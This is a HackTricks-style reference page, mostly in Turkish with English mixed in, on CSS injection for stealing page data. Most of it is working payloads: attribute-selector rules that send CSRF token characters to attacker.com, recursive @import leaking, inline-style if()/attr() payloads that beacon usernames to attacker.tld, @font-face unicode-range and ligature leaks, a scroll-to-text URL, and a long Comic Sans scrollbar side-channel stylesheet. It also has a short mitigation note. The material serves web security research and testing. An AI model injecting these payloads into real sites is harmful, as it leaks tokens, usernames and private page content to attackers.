# CSS Injection

{{#include ../../../banners/hacktricks-training.md}}

## CSS Injection

### Öznitelik Seçici

CSS seçicileri, bir `input` öğesinin `name` ve `value` özniteliklerinin değerleriyle eşleşecek şekilde hazırlanır. Eğer `input` öğesinin `value` özniteliği belirli bir karakterle başlarsa, önceden tanımlanmış bir dış kaynak yüklenir:
```css
input[name="csrf"][value^="a"] {
background-image: url(https://attacker.com/exfil/a);
}
input[name="csrf"][value^="b"] {
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name="csrf"][value^="9"] {
background-image: url(https://attacker.com/exfil/9);
}
```
Ancak, bu yaklaşım gizli input öğeleri (`type="hidden"`) ile uğraşırken bir sınırlama ile karşılaşır çünkü gizli öğeler arka planları yüklemez.

#### Gizli Öğeler için Bypass

Bu sınırlamayı aşmak için `~` genel kardeş seçicisini kullanarak sonraki bir kardeş öğeyi hedefleyebilirsiniz. CSS kuralı daha sonra gizli input öğesini takip eden tüm kardeş öğelere uygulanır ve bu da arka plan resminin yüklenmesine neden olur:
```css
input[name="csrf"][value^="csrF"] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
A practical example of exploiting this technique is detailed in the provided code snippet. You can view it [here](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).

#### CSS Injection için Gereksinimler

CSS Injection tekniğinin etkili olabilmesi için bazı koşulların sağlanması gerekir:

1. **Payload Length**: CSS injection vektörünün oluşturulmuş seçicileri barındıracak kadar uzun payloads desteklemesi gerekir.
2. **CSS Re-evaluation**: Sayfayı frame'leyebilme yeteneğine sahip olmalısınız; bu, yeni oluşturulan payloads ile CSS'in yeniden değerlendirilmesini tetiklemek için gereklidir.
3. **External Resources**: Teknik, harici olarak barındırılan resimleri kullanabilme yeteneğini varsayar. Bu, sitenin Content Security Policy (CSP) tarafından kısıtlanmış olabilir.

### Blind Attribute Selector

As [**explained in this post**](https://portswigger.net/research/blind-css-exfiltration) sayfasında açıklandığı gibi, **`:has`** ve **`:not`** seçicilerini birleştirerek kör öğelerden bile içeriği tespit etmek mümkündür.\
Bu, CSS Injection'ı yükleyen web sayfasının içinde ne olduğunu bilmediğiniz durumlarda çok kullanışlıdır.\
Ayrıca, bu seçicileri aynı türden birden fazla bloktan bilgi çıkarmak için de kullanmak mümkündür, örneğin:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background: url(/m);
}
</style>
<input name="mytoken" value="1337" />
<input name="myname" value="gareth" />
```
Bunu aşağıdaki **@import** tekniğiyle birleştirerek, [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration) ile blind sayfalardan CSS injection kullanarak çok fazla **bilgi** sızdırmak mümkün.

### @import

Önceki tekniğin bazı dezavantajları var, önkoşulları kontrol edin. Ya **victim'e birden fazla link gönderebilme** yeteneğiniz olmalı, ya da **CSS injection vulnerable page'i iframeleyebilmelisiniz**.

Ancak, tekniğin kalitesini artırmak için **CSS `@import`** kullanan başka zekice bir yöntem daha var.

Bu ilk olarak [**Pepe Vila**](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) tarafından gösterildi ve şöyle çalışıyor:

Aynı sayfayı her seferinde onlarca farklı payload ile tekrar tekrar yüklemek yerine (öncekinde olduğu gibi), sayfayı **load the page just once and just with an import to the attackers server** şeklinde sadece bir kez yüklüyoruz (bu, victim'e göndereceğimiz payload'tur):
```css
@import url("//attacker.com:5001/start?");
```
1. import, attackers tarafından bazı **CSS script** alacak ve **tarayıcı bunu yükleyecek**.
2. Attacker'ın göndereceği CSS script'in ilk kısmı **yeniden attackers sunucusuna bir `@import`** olacak.
1. Bu attackers sunucusu henüz bu isteğe yanıt vermeyecek; önce bazı karakterleri leak etmek istiyoruz ve sonra bu import'a sonraki karakterleri leak etmek için payload ile cevap vereceğiz.
3. Payload'ın ikinci ve daha büyük kısmı bir **attribute selector leakage payload** olacak
1. Bu, attackers sunucusuna **secret'in ilk karakterini ve son karakterini** gönderecek
4. attackers sunucusu **secret'in ilk ve son karakterini** aldıktan sonra, adım 2'de istenen import'a **yanıt verecek**.
1. Yanıt, **adımlar 2, 3 ve 4** ile tamamen aynı olacak, ama bu sefer secret'in **ikinci karakterini ve sonra sondan bir önceki karakteri** bulmaya çalışacak.

Attacker, secret'i tamamen leak edene kadar bu döngüyü takip edecek.

You can find the original [**Pepe Vila's code to exploit this here**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) or you can find almost the [**same code but commented here**.](#css-injection)

> [!TIP]
> Script her seferinde 2 karakter (başlangıçtan ve sondan) keşfetmeye çalışacak çünkü attribute selector şöyle şeylere izin veriyor:
>
> ```css
> /* value^=  to match the beggining of the value*/
> input[value^="0"] {
>  --s0: url(http://localhost:5001/leak?pre=0);
> }
>
> /* value$=  to match the ending of the value*/
> input[value$="f"] {
>  --e0: url(http://localhost:5001/leak?post=f);
> }
> ```
>
> Bu, script'in secret'i daha hızlı leak etmesini sağlıyor.

> [!WARNING]
> Bazen script **keşfedilen prefix + suffix'in zaten tam flag olduğunu doğru şekilde tespit etmez** ve prefix'te ileri (in the prefix) ve suffix'te geri (in the suffix) devam eder ve bir noktada takılır.\
> Endişelenmeyin, sadece **output'u** kontrol edin çünkü **flag'i orada görebilirsiniz**.

### Inline-Style CSS Exfiltration (attr() + if() + image-set())

This primitive enables exfiltration using only an element's inline style attribute, without selectors or external stylesheets. It relies on CSS custom properties, the attr() function to read same-element attributes, the new CSS if() conditionals for branching, and image-set() to trigger a network request that encodes the matched value.

> [!WARNING]
> Equality comparisons in if() require double quotes for string literals. Single quotes will not match.

- Sink: bir elementin style attribute'unu kontrol edin ve hedef attribute'un aynı elementte olduğundan emin olun (attr() sadece aynı element attribute'larını okur).
- Read: attribute'u bir CSS değişkenine kopyalayın: `--val: attr(title)`.
- Decide: değişkeni string adaylarıyla karşılaştıran iç içe conditionals kullanarak bir URL seçin: `--steal: if(style(--val:"1"): url(//attacker/1); else: url(//attacker/2))`.
- Exfiltrate: seçilen endpoint'e istek zorlamak için `background: image-set(var(--steal))` (veya herhangi bir fetching property) uygulayın.

Attempt (does not work; single quotes in comparison):
```html
<div style="--val:attr(title);--steal:if(style(--val:'1'): url(/1); else: url(/2));background:image-set(var(--steal))" title=1>test</div>
```
Çalışan payload (karşılaştırmada çift tırnak gerekli):
```html
<div style='--val:attr(title);--steal:if(style(--val:"1"): url(/1); else: url(/2));background:image-set(var(--steal))' title=1>test</div>
```
İçiçe koşullarla öznitelik değerlerini numaralandırma:
```html
<div style='--val: attr(data-uid); --steal: if(style(--val:"1"): url(/1); else: if(style(--val:"2"): url(/2); else: if(style(--val:"3"): url(/3); else: if(style(--val:"4"): url(/4); else: if(style(--val:"5"): url(/5); else: if(style(--val:"6"): url(/6); else: if(style(--val:"7"): url(/7); else: if(style(--val:"8"): url(/8); else: if(style(--val:"9"): url(/9); else: url(/10)))))))))); background: image-set(var(--steal));' data-uid='1'></div>
```
Gerçekçi demo (kullanıcı adlarını sorgulama):
```html
<div style='--val: attr(data-username); --steal: if(style(--val:"martin"): url(https://attacker.tld/martin); else: if(style(--val:"zak"): url(https://attacker.tld/zak); else: url(https://attacker.tld/james))); background: image-set(var(--steal));' data-username="james"></div>
```
Notlar ve sınırlamalar:

- Araştırma sırasında Chromium tabanlı tarayıcılarda çalışır; davranış diğer tarayıcı motorlarında farklı olabilir.
- En iyi sonlu/sayımlanabilir değer alanları (IDs, flags, kısa kullanıcı adları) için uygundur. Harici stylesheet olmadan rastgele uzun dizelerin çalınması hâlâ zordur.
- Any CSS property that fetches a URL can be used to trigger the request (e.g., background/image-set, border-image, list-style, cursor, content).

Otomasyon: a Burp Custom Action, attribute değerlerini brute-force etmek için nested inline-style payload'ları üretebilir: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda

### Diğer seçiciler

Other ways to access DOM parts with **CSS selectors**:

- **`.class-to-search:nth-child(2)`**: DOM'daki class "class-to-search" olan ikinci öğeyi arar.
- **`:empty`** selector: Örneğin [**this writeup**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty {
background-image: url("YOUR_SERVER_URL?1");
}
```

### Error based XS-Search

**Referans:** [CSS based Attack: Abusing unicode-range of @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC by @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

Genel amaç, **kontrollü bir endpoint'ten özel bir font kullanmak** ve **metnin (bu durumda, 'A') yalnızca belirtilen kaynak (`favicon.ico`) yüklenemiyorsa bu font ile görüntülenmesini sağlamak**.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face {
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range: U+0041;
}

#poc0 {
font-family: "poc";
}
</style>
</head>
<body>
<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **Custom Font Usage**:

- Özel bir yazı tipi, `<head>` bölümündeki bir `<style>` etiketi içinde `@font-face` kuralı kullanılarak tanımlanır.
- Yazı tipi `poc` olarak adlandırılır ve harici bir uç noktadan (`http://attacker.com/?leak`) alınır.
- `unicode-range` özelliği `U+0041` olarak ayarlanır, belirli Unicode karakteri 'A'yı hedefler.

2. **Object Element with Fallback Text**:
- `<body>` bölümünde `id="poc0"` olan bir `<object>` elementi oluşturulur. Bu element `http://192.168.0.1/favicon.ico` kaynağını yüklemeye çalışır.
- Bu element için `font-family` `<style>` bölümünde tanımlandığı gibi `'poc'` olarak ayarlanır.
- `favicon.ico` kaynağı yüklenemezse, `<object>` etiketinin içindeki yedek içerik (harf 'A') görüntülenir.
- Harici kaynak yüklenemezse yedek içerik ('A') özel yazı tipi `poc` kullanılarak render edilir.

### Styling Scroll-to-Text Fragment

The **`:target`** pseudo-class is employed to select an element targeted by a **URL fragment**, as specified in the [CSS Selectors Level 4 specification](https://drafts.csswg.org/selectors-4/#the-target-pseudo). It's crucial to understand that `::target-text` doesn't match any elements unless the text is explicitly targeted by the fragment.

A security concern arises when attackers exploit the **Scroll-to-text** fragment feature, allowing them to confirm the presence of specific text on a webpage by loading a resource from their server through HTML injection. The method involves injecting a CSS rule like this:
```css
:target::before {
content: url(target.png);
}
```
Böyle durumlarda, sayfada "Administrator" metni bulunuyorsa, sunucudan `target.png` isteği yapılır; bu da metnin varlığını gösterir. Bu saldırının bir örneği, enjekte edilmiş CSS'i Scroll-to-text fragment ile birlikte gömülü olarak içeren özel hazırlanmış bir URL aracılığıyla gerçekleştirilir:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
Burada saldırı, CSS kodunu iletmek için HTML injection'ı manipüle eder; hedef Scroll-to-text fragment (`#:~:text=Administrator`) aracılığıyla "Administrator" metnidir. Metin bulunursa belirtilen kaynak yüklenir ve bu istemeden varlığının saldırgana bildirilmesine yol açar.

Etkili mitigasyon için şu noktalar göz önünde bulundurulmalıdır:

1. **Constrained STTF Matching**: Scroll-to-text Fragment (STTF) yalnızca kelime veya cümlelerle eşleştirme yapacak şekilde tasarlanmıştır; bu da rastgele sırlar veya token'ları sızdırma yeteneğini sınırlar.
2. **Restriction to Top-level Browsing Contexts**: STTF yalnızca üst seviye tarayıcı bağlamlarında çalışır ve iframe'ler içinde işlev görmez; bu da herhangi bir istismar girişimini kullanıcı için daha fark edilir kılar.
3. **Necessity of User Activation**: STTF'nin çalışması için bir user-activation gesture gereklidir; bu da istismarların yalnızca kullanıcı kaynaklı navigasyonlarla mümkün olduğu anlamına gelir. Bu gereklilik, kullanıcı etkileşimi olmadan saldırıların otomatikleştirilmesi riskini büyük ölçüde azaltır. Yine de blog yazısının yazarı, belirli koşullar ve bypass'lar (ör. social engineering, yaygın tarayıcı eklentileriyle etkileşim) ile saldırının otomatikleştirilmesini kolaylaştırabilecek durumlara dikkat çekiyor.

Bu mekanizmaların ve potansiyel zayıflıkların farkında olmak, web güvenliğini korumak ve bu tür istismarcı taktiklere karşı korunmak için önemlidir.

Daha fazla bilgi için orijinal raporu inceleyin: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

[**Bu teknikle bir CTF için hazırlanmış exploit'i burada inceleyebilirsiniz**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

Belirli unicode değerleri için **harici fontlar** belirtebilirsiniz; bu fontlar yalnızca sayfada bu unicode değerleri bulunuyorsa **yüklenir**. Örneğin:
```html
<style>
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range: U+0041;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range: U+0042;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range: U+0043;
}
#sensitive-information {
font-family: poc;
}
</style>

<p id="sensitive-information">AB</p>
htm
```
When you access this page, Chrome and Firefox fetch "?A" and "?B" because text node of sensitive-information contains "A" and "B" characters. But Chrome and Firefox do not fetch "?C" because it does not contain "C". This means that we have been able to read "A" and "B".

### Text node exfiltration (I): ligatures <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Reference:** [Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

Açıklanan teknik, font ligatürlerinden yararlanarak ve genişlik değişikliklerini izleyerek bir node'daki metni çıkarmayı içerir. Süreç birkaç adımdan oluşur:

1. **Ozel Fontların Oluşturulması**:

- SVG fontları, iki karakterli bir diziyi temsil eden glypha için büyük bir genişlik ayarlayan `horiz-adv-x` attributesine sahip glyph'ler ile hazırlanır.
- Örnek SVG glyph: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, burada "XY" iki karakterlik bir diziyi gösterir.
- Bu fontlar daha sonra fontforge kullanılarak woff formatına dönüştürülür.

2. **Genişlik Değişikliklerinin Tespiti**:

- Metnin sarılmaması için CSS kullanılır (`white-space: nowrap`) ve scrollbar stili özelleştirilir.
- Yatay scrollbar'ın belirgin şekilde stilize edilmiş olarak ortaya çıkması, belirli bir ligatürün (dolayısıyla belirli bir karakter dizisinin) metinde bulunduğuna dair bir gösterge (oracle) görevi görür.
- İlgili CSS:
```css
body {
white-space: nowrap;
}
body::-webkit-scrollbar {
background: blue;
}
body::-webkit-scrollbar:horizontal {
background: url(http://attacker.com/?leak);
}
```

3. **Sömürü Süreci**:

- **Adım 1**: İki karakterlik çiftler için büyük genişlikli glyph'ler içeren fontlar oluşturulur.
- **Adım 2**: Büyük genişlikli glyph'in (iki karakterlik ligatür) render edildiğini tespit etmek için scrollbar tabanlı bir hile kullanılır; bu, ilgili karakter dizisinin varlığını gösterir.
- **Adım 3**: Bir ligatür tespit edildikten sonra, tespit edilen çifti içeren ve ona önceki veya sonraki bir karakter ekleyen üç karakterlik dizileri temsil eden yeni glyph'ler üretilir.
- **Adım 4**: Üç karakterlik ligatürün tespiti yapılır.
- **Adım 5**: Süreç tekrarlanır ve metnin tamamı kademeli olarak açığa çıkarılır.

4. **Optimizasyon**:
- Şu anki başlatma yöntemi olarak kullanılan `<meta refresh=...` optimal değil.
- Daha verimli bir yaklaşım, exploit'in performansını artıracak CSS `@import` hilesini içerebilir.

### Text node exfiltration (II): leaking the charset with a default font (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

This trick was released in this [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/). The charset used in a text node can be leaked **using the default fonts** installed in the browser: no external -or custom- fonts are needed.

Konsept, bir `div`'in genişliğini kademeli olarak genişleten bir animasyon kullanarak, metnin 'suffix' bölümünden 'prefix' bölümüne bir kerede bir karakterin geçişine izin vermeye dayanır. Bu süreç metni etkin bir şekilde iki bölüme ayırır:

1. Prefix: İlk satır.
2. Suffix: Sonraki satır(lar).

Karakterlerin geçiş aşamaları şu şekilde görünür:

C\
ADB

CA\
DB

CAD\
B

CADB

Bu geçiş sırasında, her yeni karakter prefix'e katıldıkça tespit etmek için **unicode-range trick** kullanılır. Bu, fontu Comic Sans'a geçirerek yapılır; Comic Sans varsayılan fonttan belirgin şekilde daha uzundur ve sonuçta dikey bir scrollbar tetikler. Bu scrollbar'ın ortaya çıkması, dolaylı olarak prefix'te yeni bir karakterin varlığını açığa çıkarır.

Bu yöntem benzersiz karakterlerin ortaya çıkışını tespit etmeye olanak verir, ancak hangi karakterin tekrarlandığını belirtmez; yalnızca bir tekrarın olduğu bilgisini verir.

> [!TIP]
> Temelde, **unicode-range** bir karakteri tespit etmek için kullanılır, fakat dış bir font yüklemek istemediğimiz için başka bir yol bulmamız gerekir.\
> **Karakter** **bulunduğunda**, ona önceden yüklü **Comic Sans** fontu **atanır**, bu da karakteri **daha büyük** yapar ve **bir scroll barı tetikler**; bu da bulunan karakteri **leak** eder.

Check the code extracted from the PoC:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face {
font-family: has_A;
src: local("Comic Sans MS");
unicode-range: U+41;
font-style: monospace;
}
@font-face {
font-family: has_B;
src: local("Comic Sans MS");
unicode-range: U+42;
font-style: monospace;
}
@font-face {
font-family: has_C;
src: local("Comic Sans MS");
unicode-range: U+43;
font-style: monospace;
}
@font-face {
font-family: has_D;
src: local("Comic Sans MS");
unicode-range: U+44;
font-style: monospace;
}
@font-face {
font-family: has_E;
src: local("Comic Sans MS");
unicode-range: U+45;
font-style: monospace;
}
@font-face {
font-family: has_F;
src: local("Comic Sans MS");
unicode-range: U+46;
font-style: monospace;
}
@font-face {
font-family: has_G;
src: local("Comic Sans MS");
unicode-range: U+47;
font-style: monospace;
}
@font-face {
font-family: has_H;
src: local("Comic Sans MS");
unicode-range: U+48;
font-style: monospace;
}
@font-face {
font-family: has_I;
src: local("Comic Sans MS");
unicode-range: U+49;
font-style: monospace;
}
@font-face {
font-family: has_J;
src: local("Comic Sans MS");
unicode-range: U+4a;
font-style: monospace;
}
@font-face {
font-family: has_K;
src: local("Comic Sans MS");
unicode-range: U+4b;
font-style: monospace;
}
@font-face {
font-family: has_L;
src: local("Comic Sans MS");
unicode-range: U+4c;
font-style: monospace;
}
@font-face {
font-family: has_M;
src: local("Comic Sans MS");
unicode-range: U+4d;
font-style: monospace;
}
@font-face {
font-family: has_N;
src: local("Comic Sans MS");
unicode-range: U+4e;
font-style: monospace;
}
@font-face {
font-family: has_O;
src: local("Comic Sans MS");
unicode-range: U+4f;
font-style: monospace;
}
@font-face {
font-family: has_P;
src: local("Comic Sans MS");
unicode-range: U+50;
font-style: monospace;
}
@font-face {
font-family: has_Q;
src: local("Comic Sans MS");
unicode-range: U+51;
font-style: monospace;
}
@font-face {
font-family: has_R;
src: local("Comic Sans MS");
unicode-range: U+52;
font-style: monospace;
}
@font-face {
font-family: has_S;
src: local("Comic Sans MS");
unicode-range: U+53;
font-style: monospace;
}
@font-face {
font-family: has_T;
src: local("Comic Sans MS");
unicode-range: U+54;
font-style: monospace;
}
@font-face {
font-family: has_U;
src: local("Comic Sans MS");
unicode-range: U+55;
font-style: monospace;
}
@font-face {
font-family: has_V;
src: local("Comic Sans MS");
unicode-range: U+56;
font-style: monospace;
}
@font-face {
font-family: has_W;
src: local("Comic Sans MS");
unicode-range: U+57;
font-style: monospace;
}
@font-face {
font-family: has_X;
src: local("Comic Sans MS");
unicode-range: U+58;
font-style: monospace;
}
@font-face {
font-family: has_Y;
src: local("Comic Sans MS");
unicode-range: U+59;
font-style: monospace;
}
@font-face {
font-family: has_Z;
src: local("Comic Sans MS");
unicode-range: U+5a;
font-style: monospace;
}
@font-face {
font-family: has_0;
src: local("Comic Sans MS");
unicode-range: U+30;
font-style: monospace;
}
@font-face {
font-family: has_1;
src: local("Comic Sans MS");
unicode-range: U+31;
font-style: monospace;
}
@font-face {
font-family: has_2;
src: local("Comic Sans MS");
unicode-range: U+32;
font-style: monospace;
}
@font-face {
font-family: has_3;
src: local("Comic Sans MS");
unicode-range: U+33;
font-style: monospace;
}
@font-face {
font-family: has_4;
src: local("Comic Sans MS");
unicode-range: U+34;
font-style: monospace;
}
@font-face {
font-family: has_5;
src: local("Comic Sans MS");
unicode-range: U+35;
font-style: monospace;
}
@font-face {
font-family: has_6;
src: local("Comic Sans MS");
unicode-range: U+36;
font-style: monospace;
}
@font-face {
font-family: has_7;
src: local("Comic Sans MS");
unicode-range: U+37;
font-style: monospace;
}
@font-face {
font-family: has_8;
src: local("Comic Sans MS");
unicode-range: U+38;
font-style: monospace;
}
@font-face {
font-family: has_9;
src: local("Comic Sans MS");
unicode-range: U+39;
font-style: monospace;
}
@font-face {
font-family: rest;
src: local("Courier New");
font-style: monospace;
unicode-range: U+0-10FFFF;
}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line {
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% {
font-family: rest;
} /* delay for width change */
5% {
font-family: has_A, rest;
--leak: url(?a);
}
6% {
font-family: rest;
}
10% {
font-family: has_B, rest;
--leak: url(?b);
}
11% {
font-family: rest;
}
15% {
font-family: has_C, rest;
--leak: url(?c);
}
16% {
font-family: rest;
}
20% {
font-family: has_D, rest;
--leak: url(?d);
}
21% {
font-family: rest;
}
25% {
font-family: has_E, rest;
--leak: url(?e);
}
26% {
font-family: rest;
}
30% {
font-family: has_F, rest;
--leak: url(?f);
}
31% {
font-family: rest;
}
35% {
font-family: has_G, rest;
--leak: url(?g);
}
36% {
font-family: rest;
}
40% {
font-family: has_H, rest;
--leak: url(?h);
}
41% {
font-family: rest;
}
45% {
font-family: has_I, rest;
--leak: url(?i);
}
46% {
font-family: rest;
}
50% {
font-family: has_J, rest;
--leak: url(?j);
}
51% {
font-family: rest;
}
55% {
font-family: has_K, rest;
--leak: url(?k);
}
56% {
font-family: rest;
}
60% {
font-family: has_L, rest;
--leak: url(?l);
}
61% {
font-family: rest;
}
65% {
font-family: has_M, rest;
--leak: url(?m);
}
66% {
font-family: rest;
}
70% {
font-family: has_N, rest;
--leak: url(?n);
}
71% {
font-family: rest;
}
75% {
font-family: has_O, rest;
--leak: url(?o);
}
76% {
font-family: rest;
}
80% {
font-family: has_P, rest;
--leak: url(?p);
}
81% {
font-family: rest;
}
85% {
font-family: has_Q, rest;
--leak: url(?q);
}
86% {
font-family: rest;
}
90% {
font-family: has_R, rest;
--leak: url(?r);
}
91% {
font-family: rest;
}
95% {
font-family: has_S, rest;
--leak: url(?s);
}
96% {
font-family: rest;
}
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% {
width: 0px;
}
1% {
width: 20px;
}
2% {
width: 40px;
}
3% {
width: 60px;
}
4% {
width: 80px;
}
4% {
width: 100px;
}
5% {
width: 120px;
}
6% {
width: 140px;
}
7% {
width: 0px;
}
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### Text node exfiltration (III): leaking the charset with a default font by hiding elements (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referans:** Bu, [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves) olarak belirtilmiştir

Bu durum öncekiyle çok benzerdir; ancak burada belirli **chars'ları diğerlerinden daha büyük yapmak** bir butonun bot tarafından tıklanmaması veya yüklenmeyecek bir resim gibi bir şeyi gizlemek amacıyla yapılır. Böylece eylemi (veya eylemin yokluğunu) ölçüp metin içinde belirli bir char'ın bulunup bulunmadığını anlayabiliriz.

### Text node exfiltration (III): leaking the charset by cache timing (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referans:** Bu, [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves) olarak belirtilmiştir

Bu durumda, aynı origin'den fake bir font yükleyerek metinde bir char'ın olup olmadığını leak etmeye çalışabiliriz:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
Eğer bir eşleşme olursa, **font `/static/bootstrap.min.css?q=1`'den yüklenecek**. Başarılı şekilde yüklenmese bile, **tarayıcı bunu önbelleğe almalı**, ve önbellek olmasa bile bir **304 not modified** mekanizması olduğu için, **yanıt diğer şeylere göre daha hızlı** olmalıdır.

Ancak, önbelleğe alınmış yanıt ile önbelleğe alınmamış olan arasındaki zaman farkı yeterince büyük değilse, bu işe yaramaz. Örneğin, yazar şöyle demiş: "Ancak testten sonra, ilk sorunun hızın çok farklı olmaması, ikinci sorunun ise botun `disk-cache-size=1` bayrağını kullanması olduğunu gördüm; bu gerçekten dikkatli."

### Text node exfiltration (III): leaking the charset by timing loading hundreds of local "fonts" (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** Bu, [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves) olarak bahsedilmiştir

Bu durumda, bir eşleşme olduğunda aynı origin'den yüzlerce sahte font yükleyecek **CSS** belirtebilirsiniz. Bu sayede **geçen zamanı ölçebilir** ve bir karakterin görünüp görünmediğini şu gibi bir şeyle tespit edebilirsiniz:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1), url(/static/bootstrap.min.css?q=2),
.... url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
Ve botun kodu şöyle görünüyor:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
Yani, font eşleşmiyorsa, bota yapılan ziyarette yanıt süresinin yaklaşık 30 saniye olması beklenir. Ancak font eşleşmesi varsa, fontu almak için birden fazla istek gönderilecek ve bu da ağda sürekli aktiviteye neden olacaktır. Sonuç olarak durdurma koşulunun sağlanması ve yanıtın alınması daha uzun sürecektir. Bu nedenle yanıt süresi, font eşleşmesi olup olmadığını belirlemek için bir gösterge olarak kullanılabilir.

## Referanslar

- [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
- [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
- [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
- [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)
- [Inline Style Exfiltration: leaking data with chained CSS conditionals (PortSwigger)](https://portswigger.net/research/inline-style-exfiltration)
- [InlineStyleAttributeStealer.bambda (Burp Custom Action)](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda)
- [PoC page for inline-style exfiltration](https://portswigger-labs.net/inline-style-exfiltration-ff1072wu/test.php)
- [MDN: CSS if() conditional](https://developer.mozilla.org/en-US/docs/Web/CSS/if)
- [MDN: CSS attr() function](https://developer.mozilla.org/en-US/docs/Web/CSS/attr)
- [MDN: image-set()](https://developer.mozilla.org/en-US/docs/Web/CSS/image/image-set)

{{#include ../../../banners/hacktricks-training.md}}
